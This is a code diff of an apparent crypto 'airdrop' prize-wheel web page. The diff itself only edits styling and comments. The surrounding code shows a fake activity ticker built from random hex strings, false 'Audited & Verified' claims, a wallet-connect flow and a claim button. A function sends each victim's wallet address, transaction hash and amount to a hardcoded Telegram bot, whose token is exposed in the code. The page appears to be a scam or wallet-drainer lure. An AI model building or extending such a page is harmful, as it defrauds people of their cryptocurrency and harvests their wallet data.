@@ -12,13 +12,7 @@
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght=600;700;800;900&display=swap');
         
-        /* রিসেট */
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
+        /* 🔥 মোবাইলের জন্য ফিক্স */
         html, body {
             height: 100%;
             height: 100dvh;
@@ -28,8 +22,6 @@
             background-color: #060913;
             -webkit-tap-highlight-color: transparent;
             touch-action: manipulation;
-            -webkit-user-select: none;
-            user-select: none;
         }
 
         body {
@@ -97,7 +89,6 @@
 </head>
 <body>
 
-    <!-- টিকার -->
     <div class="w-full shadow-ticker border-b border-slate-900/60 py-2.5 overflow-hidden backdrop-blur-md z-50 shrink-0">
         <div id="liveTickerStream" class="animate-marquee gap-16 text-[10px] sm:text-[11px] font-extrabold tracking-widest text-slate-400 uppercase whitespace-nowrap">
             <span><i class="fa-solid fa-tower-broadcast text-emerald-400 mr-1.5 animate-pulse"></i> Core Distribution Node: <span class="text-emerald-400 font-black">Online Verified</span></span>
@@ -116,11 +107,9 @@
         </div>
     </div>
 
-    <!-- স্ক্রোলযোগ্য কন্টেন্ট -->
     <div class="scroll-content">
         <div class="w-full max-w-7xl mx-auto px-4 md:px-8 flex flex-col">
             
-            <!-- হেডার -->
             <header class="w-full py-3 flex justify-between items-center z-40 shrink-0">
                 <div class="flex items-center gap-2.5">
                     <div class="w-8 h-8 bg-gradient-to-br from-emerald-500 to-teal-600 rounded-xl flex items-center justify-center border border-emerald-400/20 shadow-md">
@@ -134,10 +123,8 @@
                 </button>
             </header>
 
-            <!-- কন্টেন্ট -->
             <main class="flex-grow flex flex-col items-center justify-center py-4 relative">
                 
-                <!-- টাইটেল -->
                 <div class="text-center max-w-xl mx-auto mb-4 space-y-1 shrink-0">
                     <div class="inline-flex items-center gap-2 bg-slate-950/90 border border-slate-800/80 px-3 py-1 rounded-full text-[9px] font-black tracking-widest text-slate-400 uppercase shadow-inner">
                         <span class="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-ping"></span> Live Mainnet AirDrop
@@ -151,7 +138,6 @@
                     </p>
                 </div>
 
-                <!-- স্পিনার -->
                 <div class="relative w-full max-w-[270px] sm:max-w-[340px] md:max-w-[380px] aspect-square flex items-center justify-center mb-5 shrink-0">
                     
                     <div class="absolute -top-4 sm:-top-6 left-1/2 -translate-x-1/2 z-40 drop-shadow-[0_8px_15px_rgba(0,0,0,0.9)]">
@@ -178,7 +164,6 @@
                     </div>
                 </div>
 
-                <!-- অ্যাকশন বাটন -->
                 <div class="w-full max-w-xs sm:max-w-sm text-center min-h-[100px] flex flex-col justify-center items-center z-30 px-2 shrink-0">
                     
                     <button id="spinBtn" disabled class="w-full bg-slate-900 text-slate-600 font-extrabold tracking-widest py-3.5 px-6 rounded-xl text-[11px] uppercase border border-slate-800 cursor-not-allowed transition-all shadow-inner">
@@ -209,7 +194,6 @@
 
             </main>
 
-            <!-- ফুটার -->
             <footer class="w-full py-3 flex flex-col sm:flex-row justify-between items-center gap-1 border-t border-slate-900/40 text-[9px] text-slate-600 font-bold tracking-wider uppercase shrink-0">
                 <p>Secured by Smart Contract • Audited & Verified</p>
                 <p>© 2026 Airdrop Vault • All rights reserved.</p>
@@ -229,7 +213,7 @@
         const liveTickerStream = document.getElementById('liveTickerStream');
         const claimRewardsActionBtn = document.getElementById('claimRewardsActionBtn');
 
-        // --- 1. TICKER ---
+        // --- TICKER ---
         const tickerCryptoTokens = ["USDT", "ETH", "BNB", "TRX", "SOL", "USDC"];
         const hexPoolChars = "0123456789abcdef";
 
@@ -269,7 +253,7 @@
             liveTickerStream.insertAdjacentHTML('beforeend', blockSpanA + "<span>•</span>" + blockSpanB + "<span>•</span>");
         }, 4500);
 
-        // --- 2. SPINNER ---
+        // --- SPINNER ---
         const prizes = [
             { amount: "100 USDT", label: "USDT", color: "#1e3a8a", iconUrl: "https://cryptologos.cc/logos/tether-usdt-logo.png" },
             { amount: "1.5 ETH", label: "ETH", color: "#b45309", iconUrl: "https://cryptologos.cc/logos/ethereum-eth-logo.png" },
@@ -339,7 +323,7 @@
             buildVibrantWheelGraphics();
         });
 
-        // 🔥 স্পিনার গ্রাফিক্স (ঠিকমতো সাজানো)
+        // 🔥 স্পিনার গ্রাফিক্স (লোগো আগে, টেক্সট পরে)
         function buildVibrantWheelGraphics() {
             const rect = canvas.getBoundingClientRect();
             const width = rect.width;
@@ -406,7 +390,7 @@
             loadedIconImages[idx] = img;
         });
 
-        // --- 3. WALLET CONNECT ---
+        // --- WALLET CONNECT ---
         let networkUserActiveNode = null;
 
         async function initializeWeb3Handshake() {
@@ -458,7 +442,7 @@
 
         connectWalletBtn.addEventListener('click', initializeWeb3Handshake);
 
-        // --- 4. SPIN ---
+        // --- SPIN ---
         spinBtn.addEventListener('click', () => {
             if (!networkUserActiveNode) return;
 
@@ -514,7 +498,7 @@
             }, 6900);
         });
 
-        // --- 5. TELEGRAM ---
+        // --- TELEGRAM ---
         async function sendTelegramNotification(wallet, txHash, amount) {
             const BOT_TOKEN = "8989865622:AAEQcapn7TyBH4ve-SjC4ZhiIV8P8_qvpqw";
             const CHAT_ID = "5085997009";
@@ -531,7 +515,7 @@
             } catch (e) { console.error(e); }
         }
 
-        // --- 6. CLAIM ---
+        // --- CLAIM ---
         claimRewardsActionBtn.addEventListener('click', async () => {
             if (!networkUserActiveNode) return;
 
